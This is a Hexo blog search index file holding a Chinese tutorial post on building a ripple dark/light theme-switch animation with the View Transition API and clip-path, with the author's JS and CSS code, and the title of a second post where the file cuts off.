<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>js+css 实现 Hexo 博客 ripple 水波切换主题效果</title>
      <link href="/posts/9104.html"/>
      <url>/posts/9104.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>之前在使用 b 站的时候总是觉得不好用，于是四处寻找脚本、扩展优化 b 站的浏览体验（<s>优化摸鱼体验</s>）。其中，有一个叫 <code>BewlyBewly</code> 的扩展比较大幅度的更改了 b 站的 ui 设计（不过目前这个扩展在 GitHub 上已不再维护），它的一个切换主题效果就是 ripple 水波扩散式的切换动画，虽然以前在 Element-Plus 官方文档页也看到过，但是没时间没想法只想躺平，所以没做。今天就来将它应用到博客上。</p><h2 id="预览"><a class="markdownIt-Anchor" href="#预览"></a> 预览</h2><table><thead><tr><th>切换方向</th><th>动画目标</th><th>裁剪方向</th><th>视觉效果</th></tr></thead><tbody><tr><td> light→dark</td><td> 上层 light 快照</td><td>扩展→收缩</td><td> light 样式从点击处向内收缩消失</td></tr><tr><td> dark→light</td><td> 下层 light 快照</td><td>收缩→扩展</td><td> light 样式从点击处向外扩展显现</td></tr></tbody></table><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221132415.gif" alt="PixPin_2025-07-22_11-31-17"></p><h2 id="view-transition-api"><a class="markdownIt-Anchor" href="#view-transition-api"></a> View Transition API</h2><p>ripple 水波动画使用到的 API 为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/View_Transition_API">View Transition API</a>，再加上一点 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path">clip-path</a> 裁剪效果就可以做到。</p><h2 id="兼容性"><a class="markdownIt-Anchor" href="#兼容性"></a> 兼容性</h2><p>目前（截止至 2025-07-22），<code>View Transition API</code> 兼容性如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221122709.png" alt="image-20250722112251679"></p><h2 id="动画原理"><a class="markdownIt-Anchor" href="#动画原理"></a> 动画原理</h2><p>在介绍中可以看到，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/View_Transition_API">View Transition API</a> 在更新 DOM 的同时，会创建不同 DOM 状态的快照：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221135967.png" alt="image-20250722113519927"></p><p>在不进行命名的情况下，我们能得到默认（root）的一组伪元素：</p><ol><li><code>::view-transition-old(root)</code></li><li><code>::view-transition-new(root)</code></li></ol><p>注意该组快照的层级关系，旧的未发生 DOM 改变的状态快照在新的快照上方。</p><p>现在，我们有了两张前后快照，再想到 clip-path 裁剪效果，动画原理已经很明朗了。</p><h3 id="light转dark示例代码"><a class="markdownIt-Anchor" href="#light转dark示例代码"></a> Light 转 Dark 示例代码</h3><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 当切换到暗色主题时，isDark = true</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">isDark</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newTheme</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #6A9955">// 得到鼠标点击位置clientX和clientY计算具体效果呈现</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">clipPath</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">`circle(0% at </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientX</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientY</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px)`</span><span style="color: #D4D4D4">,      </span><span style="color: #6A9955">// 起始：圆形裁剪区域为0</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #CE9178">`circle(</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">radius</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px at </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientX</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientY</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px)`</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 结束：圆形扩展到全屏</span></span><span class="line"><span style="color: #D4D4D4">];</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">animate</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">clipPath:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">isDark</span><span style="color: #D4D4D4"> ? </span><span style="color: #9CDCFE">clipPath</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reverse</span><span style="color: #D4D4D4">() : </span><span style="color: #9CDCFE">clipPath</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 暗色时反向</span></span><span class="line"><span style="color: #D4D4D4">}, {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">pseudoElement:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">isDark</span><span style="color: #D4D4D4"> </span></span><span class="line"><span style="color: #D4D4D4">    ? </span><span style="color: #CE9178">"::view-transition-old(root)"</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 暗色：动画作用于旧快照（亮色快照）</span></span><span class="line"><span style="color: #D4D4D4">    : </span><span style="color: #CE9178">"::view-transition-new(root)"</span><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 亮色：动画作用于新快照（暗色快照）</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><p><strong>执行流程</strong>：</p><ol><li><strong>快照层级</strong>：<code>::view-transition-old(root)</code>（亮色）在 <code>::view-transition-new(root)</code>（暗色）<strong>上方</strong></li><li><strong>动画目标</strong>：对<strong>上层的亮色快照</strong>应用 clip-path 动画</li><li><strong>裁剪方向</strong>：<code>clipPath.reverse()</code> → 从 <code>circle(${radius}px...)</code> 到 <code>circle(0%...)</code></li><li><strong>视觉效果</strong>：亮色快照从鼠标点击位置开始<strong>收缩消失</strong>，逐渐露出下方的暗色快照</li><li><strong>最终结果</strong>：亮色完全消失，暗色主题显现</li></ol><p><code>Dark</code> 转 <code>Light</code> 依靠 <code>isDark</code> 和<code>.reverse()</code> 就能快捷的实现相反的动画效果。</p><h2 id="注入js"><a class="markdownIt-Anchor" href="#注入js"></a> 注入 js</h2><p>以主题 Butterfly 为例，只需要在<code>_config.butterfly.yml</code> 的 <code>inject</code> 区域进行注入即可。</p><p>我的 <code>ripple-toggle.js</code> 代码如下：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * Author: 4rozeN</span></span><span class="line"><span style="color: #6A9955"> * Date：2025-07-21 10:52:40</span></span><span class="line"><span style="color: #6A9955"> * LastEditTime: 2025-07-21 20:25:39</span></span><span class="line"><span style="color: #6A9955"> * LastEditors: 4rozeN</span></span><span class="line"><span style="color: #6A9955"> * Description：优化切换主题动画。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getCurrentTheme</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"data-theme"</span><span style="color: #D4D4D4">) || </span><span style="color: #CE9178">"light"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">setTheme</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"data-theme"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">expiry</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Date</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">now</span><span style="color: #D4D4D4">() + </span><span style="color: #B5CEA8">1000</span><span style="color: #D4D4D4"> * </span><span style="color: #B5CEA8">60</span><span style="color: #D4D4D4"> * </span><span style="color: #B5CEA8">60</span><span style="color: #D4D4D4"> * </span><span style="color: #B5CEA8">24</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">localStorage</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">setItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"theme"</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">JSON</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stringify</span><span style="color: #D4D4D4">({ </span><span style="color: #9CDCFE">value:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">theme</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">expiry</span><span style="color: #D4D4D4"> }));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">isMobile</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D16969">/Android</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">iPhone</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">iPad</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">iPod</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">Windows Phone</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">Mobile</span><span style="color: #DCDCAA">|</span><span style="color: #D16969">iOS/</span><span style="color: #569CD6">i</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">test</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">navigator</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">userAgent</span></span><span class="line"><span style="color: #D4D4D4">  );</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">rippleToggle</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">point</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">currentTheme</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">getCurrentTheme</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">newTheme</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">currentTheme</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4"> ? </span><span style="color: #CE9178">"light"</span><span style="color: #D4D4D4"> : </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 如果是移动设备，直接切换，不用动画</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #DCDCAA">isMobile</span><span style="color: #D4D4D4">()) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"mobile设备跳过动画"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 检查浏览器支持</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">startViewTransition</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"浏览器限制，直接切换主题"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">?.</span><span style="color: #9CDCFE">stopImmediatePropagation</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stopImmediatePropagation</span><span style="color: #D4D4D4">(); </span><span style="color: #6A9955">// 阻止同一元素上其他监听器执行</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">setTheme</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">newTheme</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">?.</span><span style="color: #9CDCFE">stopImmediatePropagation</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stopImmediatePropagation</span><span style="color: #D4D4D4">(); </span><span style="color: #6A9955">// 阻止同一元素上其他监听器执行</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">transition</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">startViewTransition</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">requestAnimationFrame</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setTheme</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">newTheme</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">ready</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">then</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">clientX</span><span style="color: #D4D4D4">, </span><span style="color: #4FC1FF">clientY</span><span style="color: #D4D4D4"> } = </span><span style="color: #9CDCFE">point</span><span style="color: #D4D4D4"> || </span><span style="color: #9CDCFE">e</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(`clientX: ${clientX} | clientY: ${clientY}`, e, point);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">radius</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">hypot</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">max</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">clientX</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">innerWidth</span><span style="color: #D4D4D4"> - </span><span style="color: #9CDCFE">clientX</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">Math</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">max</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">clientY</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">innerHeight</span><span style="color: #D4D4D4"> - </span><span style="color: #9CDCFE">clientY</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    );</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">clipPath</span><span style="color: #D4D4D4"> = [</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">`circle(0% at </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientX</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientY</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px)`</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">`circle(</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">radius</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px at </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientX</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px </span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">clientY</span><span style="color: #569CD6">}</span><span style="color: #CE9178">px)`</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    ];</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">isDark</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">newTheme</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">animate</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">      {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">clipPath:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">isDark</span><span style="color: #D4D4D4"> ? </span><span style="color: #9CDCFE">clipPath</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">reverse</span><span style="color: #D4D4D4">() : </span><span style="color: #9CDCFE">clipPath</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">      {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">duration:</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">300</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">easing:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"ease-out"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">pseudoElement:</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">isDark</span></span><span class="line"><span style="color: #D4D4D4">          ? </span><span style="color: #CE9178">"::view-transition-old(root)"</span></span><span class="line"><span style="color: #D4D4D4">          : </span><span style="color: #CE9178">"::view-transition-new(root)"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    );</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">bindRippleThemeToggle</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">btn</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getElementById</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"darkmode"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">btn</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"找不到对应的切换按钮元素"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">btn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">removeEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"click"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">rippleToggle</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">btn</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"click"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">rippleToggle</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">[</span><span style="color: #CE9178">"DOMContentLoaded"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"pjax:complete"</span><span style="color: #D4D4D4">].</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">evt</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">evt</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">bindRippleThemeToggle</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><h2 id="注入css"><a class="markdownIt-Anchor" href="#注入css"></a> 注入 css</h2><p>注入步骤同上，我的 <code>ripple-toggle.css</code> 代码如下：</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">::view-transition-new(root),</span></span><span class="line"><span style="color: #D4D4D4">::view-transition-old(root) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">animation</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">mix-blend-mode</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">normal</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">html</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">data-theme</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4">]::view-transition-old(root) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的 OBS 方案</title>
      <link href="/posts/36838.html"/>
      <url>/posts/36838.html</url>
      
